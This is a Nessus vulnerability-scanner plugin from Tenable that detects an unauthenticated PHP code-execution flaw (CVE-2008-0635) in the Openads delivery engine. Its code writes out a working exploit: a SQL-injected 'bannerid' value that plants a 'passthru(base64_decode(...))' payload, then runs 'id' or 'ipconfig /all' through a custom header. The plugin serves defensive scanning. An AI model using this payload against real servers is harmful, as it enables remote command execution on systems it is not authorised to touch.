#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if (description)
{
  script_id(34372);
  script_version("$Revision: 1.3 $");

  script_cve_id("CVE-2008-0635");
  script_bugtraq_id(27603);
  script_xref(name:"OSVDB", value:"41113");
  script_xref(name:"Secunia", value:"28790");

  script_name(english:"Openads Delivery Engine OA_Delivery_Cache_store() Function name Argument Arbitrary PHP Code Execution");
  script_summary(english:"Tries to run a command");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that allows injection
of arbitrary PHP commands." );
 script_set_attribute(attribute:"description", value:
"The remote host is running Openads, an open source ad serving
application written in PHP. 

The installed version of Openads contains a vulnerability in its
delivery engine in that it fails to properly sanitize input to the
'name' argument of the 'OA_Delivery_Cache_store()' function in various
scripts under 'www/delivery' before saving it in a cache file.  An
unauthenticated remote attacker can exploit this issue to inject
arbitrary PHP code and then execute it on the remote host, subject to
the privileges under which the web server operates." );
 script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/archive/1/487486/100/0/threaded" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to Openads 2.4.3 or later." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P" );
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2008-2009 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl", "os_fingerprint.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


os = get_kb_item("Host/OS");
if (os)
{
  if ("Windows" >!< os) cmd = "id";
  else cmd = "ipconfig /all";
  cmds = make_list(cmd);
}
else cmds = make_list("id", "ipconfig /all");
cmd_pats = make_array();
cmd_pats["id"] = "uid=[0-9]+.*gid=[0-9]+.*";
cmd_pats["ipconfig /all"] = "Windows IP Configuration";


# Loop through directories.
if (thorough_tests) dirs = list_uniq(make_list("/openads", "/ads", "/adserver", "/openx", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs)
{
  # Inject our exploit.
  #
  # nb: we also leverage a SQL injection issue to avoid having to find
  #     a valid bannerid; without it, OA_Delivery_Cache_buildFileName()
  #     won't be called and the exploit won't work.
  var = string("NESSUS_", toupper(rand_str()));
  exploit = string("-", unixtime(), " OR 1=1 -- ';passthru(base64_decode($_SERVER[HTTP_", var, "]));die;/*");
  url = string(
    dir, "/www/delivery/ac.php?",
    "bannerid=", str_replace(find:" ", replace:"+", string:exploit)
  );

  req = http_get(item:url, port:port);
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  # If we see an ad...
  if ("www/delivery/ck.php?oaparams=" >< res)
  {
    # Try to execute a command.
    foreach cmd (cmds)
    {
      req = http_get(item:url, port:port);
      req = str_replace(
        string:req,
        find:"User-Agent:",
        replace:string(
          var, ": ", base64(str:cmd), "\r\n",
          "User-Agent:"
        )
      );
      res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
      # nb: res will be NULL if the command fails!
      #
      # if (res == NULL) exit(0);

      # There's a problem if we see output from our command.
      if (egrep(pattern:cmd_pats[cmd], string:res))
      {
        if (report_verbosity)
        {
          output = "";
          foreach line (split(res, keep:TRUE))
            output += ereg_replace(pattern:'^[ \t]*', replace:"  ", string:line);

          report = string(
            "\n",
            "Nessus was able to execute the command '", cmd, "' on the remote\n",
            "host. This produced the following results :\n",
            "\n",
            output
          );
          security_hole(port:port, extra:report);
        }
        else security_hole(port);
        exit(0);
      }
    }
  }
}
